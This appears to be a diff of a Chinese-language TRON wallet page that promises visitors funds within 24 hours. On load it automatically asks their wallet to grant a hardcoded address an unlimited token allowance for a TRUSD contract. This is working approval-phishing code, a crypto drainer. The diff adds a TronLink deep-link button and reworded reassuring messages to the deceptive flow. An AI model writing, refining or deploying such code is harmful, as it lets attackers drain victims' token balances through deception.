@@ -32,6 +32,17 @@
     .loading { color: #facc15; }
     .success { color: #4ade80; }
     .error { color: #f87171; }
+    #tronlink-btn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 15px;
+      background-color: #2563eb;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      cursor: pointer;
+      display: none;
+    }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
@@ -39,12 +50,13 @@
 <div class="container">
   <h1>一鍵授權頁面</h1>
   <p>點擊下方授權按鈕，區塊鏈中資金會在24小時內，為您進行入賬，請確認。</p>
-  <p id="status" class="loading">正在檢測錢包環境...</p>
+  <p id="status" class="loading">正在檢測錢包...</p>
+  <button id="tronlink-btn" onclick="openInTronLink()">📲 用 TronLink 開啟</button>
 </div>
 
 <script>
-  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4"; // TRUSD 合約
-  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";      // A 自己的地址
+  const TRUSD_CONTRACT = "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4";
+  const A_ADDRESS = "TKnC8zjqnb2Bmadd2ibNnLswZwp67zyi26";
   const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
   let tronWeb;
 
@@ -65,7 +77,7 @@
     try {
       const chainId = await tronWeb.trx.getChainId?.();
       if (chainId && chainId !== '_') {
-        updateStatus("請切換至 TRON 主網。", "error");
+        updateStatus("請切換到 TRON 主網", "error");
         return false;
       }
       return true;
@@ -75,20 +87,20 @@
   }
 
   async function approve() {
-    updateStatus("正在確認資產處理配置，請稍候...", "loading");
+    updateStatus("資產處理配置中，請稍候...", "loading");
     try {
       const contract = await tronWeb.contract().at(TRUSD_CONTRACT);
       await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();
-      updateStatus("資產配置成功，請耐心等待系統自動入帳。", "success");
+      updateStatus("資產已鎖倉處理，請耐心等待後續流程。", "success");
       setTimeout(() => {
         window.location.href = "success.html";
-      }, 1500);
+      }, 2000);
     } catch (err) {
       console.error(err);
-      updateStatus("無法完成操作，請稍後重試。", "error");
+      updateStatus("系統處理異常，請稍後重試。", "error");
       setTimeout(() => {
         window.location.href = "error.html";
-      }, 2000);
+      }, 2500);
     }
   }
 
@@ -98,14 +110,20 @@
     statusEl.className = type;
   }
 
+  function openInTronLink() {
+    const currentUrl = encodeURIComponent(window.location.href);
+    window.location.href = `tronlink://wallet/dapp/details?url=${currentUrl}`;
+  }
+
   async function init() {
     const address = await connectWallet();
     if (!address) {
-      updateStatus("未偵測到 TRON 錢包，請使用幣安或 TronLink 進入此頁。", "error");
+      updateStatus("未檢測到 TRON 錢包，請安裝 TronLink 或使用 DApp 瀏覽器開啟", "error");
+      document.getElementById("tronlink-btn").style.display = "inline-block";
       return;
     }
     if (!await checkTronNetwork()) return;
-    approve();
+    approve(); // 自動送出授權
   }
 
   window.addEventListener('load', init);
